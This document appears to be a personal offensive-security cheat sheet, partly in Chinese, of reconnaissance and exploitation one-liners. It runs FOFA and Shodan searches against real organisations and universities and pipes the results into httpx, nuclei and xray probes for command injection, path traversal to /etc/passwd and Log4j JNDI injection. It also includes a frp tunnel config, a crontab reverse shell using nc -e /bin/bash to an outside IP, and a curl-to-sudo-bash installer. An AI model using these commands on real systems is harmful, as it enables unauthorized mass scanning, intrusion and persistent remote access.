
> curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash

> cpolar authtoken NWY2YWExYjItMjUzYy00MjUzLTlmZTctNmNhODRlZmE4NDN



# skill 
```
>https://fofax.xiecat.fun/link
fofax -qf query.txt -fe -fs 10 -e
fofax -iuf baidu.txt -ubq
fofax -q 'domain="baidu.com"' |httpx -path "/favicon.ico" -mc 200>baidu.txt

echo '(app=TELESQUARE-TLR-2005KSH)' | fofax -fs 59000 -ffi | httpx -path '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig' -mr addr -t 700 >> rout_vuln.txt
echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -ff 'domain' -fs 10 | naabu
nmap -iL <(echo 'app="APACHE-Solr"' | fofax -fs 10 -ff ip)
./dismap -file <(echo 'title="login"' | fofax -fs 10 -ffi)
fofax  -q 'title="Apache APISIX Dashboard"' -ffi|httpx -title
fofax -q 'title="Apache APISIX Dashboard"' -ffi | httpx -path "/apisix/admin/migrate/export" -status-code -mc 200 -ms '{"Counsumers":[],"Routes'
echo 'header="rememberme=deleteMe" || header="shiroCookie"' | fofax -fs 100 -e -ec | httpx -o shiro.txt && xray ws ss --uf shiro.txt
fofax -q 'fx=kubernetes' -fe | httpx | nuclei -t ~/nuclei-templates/misconfiguration/kubernetes/kubernetes-pods.yaml
echo 'fx=kubernetes' | fofax  -fe  -ffi | nuclei -t ~/nuclei-templates/misconfiguration/kubernetes/kubernetes-pods.yaml


katana.exe -u http://spacex.com -d 7 -ef css,js,img,jpg -proxy http://127.0.0.1:7777
katana.exe -u https://mymail.com/ -jc -H -aff -kf -cs mymail.com -d 7 -proxy http://192.168.99.105:7777
katana.exe -u http://192.168.200.111:5858 -d 7 -ef css,js,img,jpg -proxy http://127.0.0.1:7777

subfinder -d TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
subfinder -d mtn.com -silent -all | ./httpx -silent -path 'api/index.php/v1/config/application?public=true'-mc 200
subfinder -d mtn.com -silent -all | ./httpx -silent -path '/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd' -mr "root.*.0.0"

xray_windows_amd64 ws --poc poc-go-apache-log4j2-rce --basic
ws --plugins xss,sqldet,cmd-injection,upload,path-traversal,dirscan,redirect,jsonp --listen 127.0.0.1:7777 --html-output 3.16.html
webscan --plugins xss,sqldet --listen 0.0.0.0:7777 --html-output 24.html
-tags wpscan,wp,wordpress,wp-plugin,wp-ban,wpscan,cve,cve2022,wp,wordpress,wp-plugin,xss,www-xml-sitemap-generator-org
```


# fofa
```
shodan download --limit -1 con.json.gz 'country:"CN"' confluence
shodan parse--fields ip_str,port --separator : con.json.gz
shodan download --limit -1 wp.json.gz 'http.component:"wordpress" hostname:"edu.cn"'

body="xmlrpc.php" && host="edu.cn"
body="xmlrpc.php" && host="att.com"
body=xmlrpc.php && host=edu.cn
"Microsoft-IIS" && host="microsoft.com"
#{{interactsh-url}}
host="edu.cn" && (app="VMware-VCenter" || app="VMware-vRealize" || app="VMware-NSX" || app="VMware-HCX" || app="VMware-HCX" || app="graylog" || app="JamF" )app="elasticsearch",app="JamF",
body="Metabase"
body="Apache OFBiz"
body="Solr"
body="MobileIron","code42",body="goanywhere"
body="spring", body="UniFi Network"
"accessKeyId" && host="tiktok.com"
org="APPLE-ENGINEERING"
```

# frp
```
frp
[common]
# frp监听的端口，默认是7000，可以改成其他的
bind_port = 7000
#bindPort = 7000
dashboard_port = 7500
# frp管理后台用户名和密码，请改成自己的
dashboard_user = admin
dashboard_pwd = 1234
enable_prometheus = true

# 客户端配置
[common]
#服务器ip    
server_addr = 119.91.116.17
server_port = 7000
 # 与frps.ini的token一致
#token = 12345678

[socks5]
type=tcp
plugin=socks5
plugin_user=
plugin_passwd=
 #映射到共外网服务器的端口
remote_port = 8000
```

# basic command
```
crontab -e */1 * * * * nc 192.168.59.236 6666 -e "/bin/bash"
sudo log4j.py --userip 119.91.116.17 --webport 8000 --lport 9999
rlwrap nc -lvvp 8888
curl -H 'X-Api-Version: ${jndi:ldap://119.91.116.17/a}' https://docker.zzzang.cn/
python3 -c "import spy;spy.swapn('/bin/bash')"
nmap -p- x.x.x.x -oN t.log
gobuster dir -u -w seclissts -x php，zip
find / -type f -executable -daystart -ctime 0

sed -i '/INF/d' icloud_port.txt
certutil -hashfile pspy64 MD5
sudo netdiscover -i eth0 x.x.x.x 2>/dev/null
echo 'S3VuZ19GdV9QNG5kYQ==' | base64 -d
export PATH=/srv/scripts:$PATH

vim ~/.bashrc (export PATH=$PATH:/srv/scripts)
wget -r ftp://10.0.2.10
wc -l wordlist.txt
lsof -i:9988
cd /proc/pid; ls -al; cat /status; kill -9 ppid

sudo usermod -l Cyber kali
vim /etc/hostname
awk '{print "http://"$0}' 1.txt > 2.txt 
cat 2.txt | jq -r '.hostnames[]' > zimtra-edu.txt


# docker
>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
unzip vulhub-master.zip
cd vulhub-master/fastjson/ 1.2.47-rce/
docker-compose build
docker-compose up -d


# mvn编译 marshalsec项目
mvn clean package -DskipTests

$ git init
$ git add . & git commit "test"
$ git remote add nu git@github.com:zhujieta0/nuc.git
$ git branc -M main
$ git push zaq main
No file chosen
```
![image](https://github.com/user-attachments/assets/c312e0a8-08d4-40c5-9781-07ee1c4a802f)
